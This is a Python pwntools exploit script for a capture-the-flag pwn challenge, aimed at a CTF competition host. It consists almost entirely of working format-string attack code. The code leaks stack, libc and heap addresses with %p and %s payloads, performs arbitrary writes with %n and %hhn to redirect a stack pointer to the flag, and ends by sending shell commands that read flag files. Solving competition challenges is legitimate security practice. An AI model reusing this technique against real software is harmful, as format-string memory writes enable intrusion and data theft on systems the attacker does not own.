#!/usr/bin/env python3

from pwn import *
import codecs
import warnings

if args.SWARM:
    context.log_level = "ERROR"

exe = ELF("./chall_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]
warnings.filterwarnings("ignore", category=BytesWarning)

def debug():
    if args.GDB_DEBUG:
        gdb.attach(p, '''
        c
        ''')
        pause()

def conn():
    if args.LOCAL:
        p = process([exe.path])
    else:
        p = remote("gzcli.ctf.cyberjawara.id", 32768)
    return p

p = conn()

payload1 = "%44$p %45$p"
p.sendlineafter("Tips!", payload1)

p.recvuntil("Tip #1: ")
stack_leak, libc_leak = list(map(lambda x: int(x, 16), p.recvline().split()))
print(hex(stack_leak))
print(hex(libc_leak))

heap_leak_addr = libc_leak + 0x1d9016 + 1

payload2 = b"%11$sABC" + p64(heap_leak_addr).strip(b'\0')
p.sendlineafter("Input:", payload2)

p.recvuntil("Tip #2: ")
heap_leak = u64(p.recvuntil("ABC")[:-3].ljust(8, b'\0')) << 8
print(hex(heap_leak))

i_addr = stack_leak - 0x1b4 + 3
print(hex(i_addr))
payload3 = b"%255c%12$nABCDEF" + p64(i_addr).strip(b'\0')
p.sendlineafter("Input:", payload3)

flag_addr = heap_leak + 0x480
target_addr = stack_leak - 0x78
print(hex(target_addr))
for i in range(5):
    p.recvuntil(":")
    payload = (b"%" + str(flag_addr & 0xff).encode() + b"c%12$hhn").ljust(16, b'a') + p64(target_addr).strip(b'\0')
    target_addr += 1
    flag_addr >>= 8
    p.sendlineafter("Input:", payload)

p.recvuntil(":")
payload = b"%49$s"
p.sendlineafter("Input:", payload)
#p.recvuntil(":")

debug()

if not args.SWARM:
    p.interactive()
else:
    # print out the flag to stdout
    p.sendline("cat ./flag*")
    p.sendline("cat /flag*")
    p.sendline("cat /home/*/flag*")
    print(p.recvall(timeout=3), flush=True)
